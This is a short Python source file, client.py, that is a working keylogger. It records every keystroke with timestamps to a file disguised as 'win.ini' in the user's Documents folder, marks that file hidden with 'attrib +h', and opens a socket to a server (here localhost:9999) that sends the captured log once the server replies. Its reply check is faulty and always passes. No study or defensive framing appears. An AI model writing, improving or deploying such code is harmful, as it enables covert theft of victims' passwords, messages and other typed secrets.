# client.py
import socket
import os
import logging
import time
import threading
from pynput.keyboard import Listener
host = 'localhost'
port = 9999
file_path = fr"C:\Users\{os.getlogin()}\Documents\win.ini"
def network_manager():
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
        data = client_socket.recv(1024)
        if data == b"y" or b"Y":
            file = open(file_path, "rb")
            file_contents = file.read()
            client_socket.sendall(file_contents)
            file.close()

def keylogger():
    log_directory = fr"C:\Users\{os.getlogin()}\Documents" # save log file in this path
    logging.basicConfig(filename=(log_directory + r"\win.ini"), level=logging.DEBUG, format='%(asctime)s: %(message)s') # each keystroke has a time stamp
    os.system(fr"attrib +h C:\Users\{os.getlogin()}\Documents\win.ini") # make file hidden.
    last_logged = {}
    log_interval = 0.1
    def on_press(key):
        current_time = time.time()
        key_str = str(key)
        if key_str not in last_logged or current_time - last_logged[key_str] > log_interval:
            last_logged[key_str] = current_time
            logging.info(key_str) # This is to avoid lots of spamming.
    with Listener(on_press=on_press) as listener:
        listener.join()
network_thread = threading.Thread(target=network_manager)
keylogging_thread = threading.Thread(target=keylogger)
network_thread.start()
keylogging_thread.start()